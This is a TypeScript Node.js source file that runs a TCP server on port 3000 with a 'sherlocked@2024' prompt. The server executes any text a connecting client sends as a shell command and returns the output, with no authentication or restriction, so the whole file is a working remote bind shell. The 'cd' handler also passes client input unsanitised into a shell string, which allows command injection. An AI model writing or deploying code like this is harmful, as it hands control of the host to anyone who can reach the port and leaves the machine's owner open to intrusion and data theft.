import { exec } from 'child_process';
import { Socket, createServer } from 'net'; // Removed extra comma
import { join } from 'path';

const PORT = 3000; // Change the port if needed
let currentDirectory = process.cwd();

// Create a server instance
const server = createServer((socket: Socket) => {
  console.log('Client connected');

  // Event listener for data received from clients
  socket.on('data', (data: Buffer) => {
    const command = data.toString().trim();
    console.log(`Received command: ${command}`);

    // Attempt to get present working directory
    if (command === 'ls') {
    exec('ls', { cwd: currentDirectory }, (error, stdout, stderr) => {
    if (error) {
      socket.write(`Error: ${error.message}\n-------------------------\nsherlocked@2024:`);
    } else {
      if (stderr) {
        socket.write(`stderr: ${stderr}\n-------------------------\nsherlocked@2024:`);
      } else {
        socket.write(`Current files in the directory: \n${stdout}`);
      }
    }
  });
}
    
    // Attempt to get present working directory
    else if (command === 'pwd') {
      exec(`pwd`, (error) => {
        if (error) {
          socket.write(`Error: ${error.message}\n-------------------------\nsherlocked@2024:`);
        } else {
          socket.write(`Current directory to: ${currentDirectory}\n-------------------------\nsherlocked@2024:`);
        }
      });
    }

    // Handle 'cd' command separately
    else if (command.startsWith('cd')) {
      const args = command.split(' ');
      const directory = args[1] || ''; // Extract directory from the command
      const newPath = join(currentDirectory, directory); // Calculate the new path

      // Attempt to change directory
      exec(`cd ${newPath}`, (error) => {
        if (error) {
          socket.write(`Error: ${error.message}\n-------------------------\nsherlocked@2024:`);
        } else {
          currentDirectory = newPath; // Update the current directory
          socket.write(`Changed directory to: ${currentDirectory}\n`);
        }
      });
    } else {
      // Execute other commands using child_process.exec()
      exec(command, (error, stdout, stderr) => {
        if (error) {
          socket.write(`Error: ${error.message}\n-------------------------\nsherlocked@2024:`);
          return;
        }
        if (stderr) {
          socket.write(`stderr: ${stderr}\n`);
          return;
        }
        socket.write(`${stdout}\n--------------------------\nsherlocked@2024:sherlocked@2024:`);
      });
    }
  });

  // Event listener for client disconnection
  socket.on('end', () => {
    console.log('Client disconnected');
  });

  // Event listener for errors
  socket.on('error', (err: Error) => {
    console.error('Socket error:', err);
  });
});

// Listen for connections
server.listen(PORT, () => {
  console.log(`Server listening on port ${PORT}`);
});
